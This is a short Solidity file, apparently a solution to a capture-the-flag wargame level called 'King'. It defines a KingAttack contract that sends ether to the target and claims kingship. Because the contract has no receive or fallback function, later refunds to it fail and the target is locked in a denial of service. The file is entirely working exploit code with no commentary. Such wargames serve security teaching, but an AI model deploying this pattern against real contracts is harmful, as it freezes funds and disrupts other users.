//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./09.King.sol"; 

contract KingAttack {
    King public kingo;

    constructor(address payable _kingAddress) payable {
        kingo = King(_kingAddress);
    }

    function attackKing() public payable {
        address kingoAddr = address(kingo);
        (bool sent, ) =  kingoAddr.call{value: msg.value}("");
        require(sent);
    }
}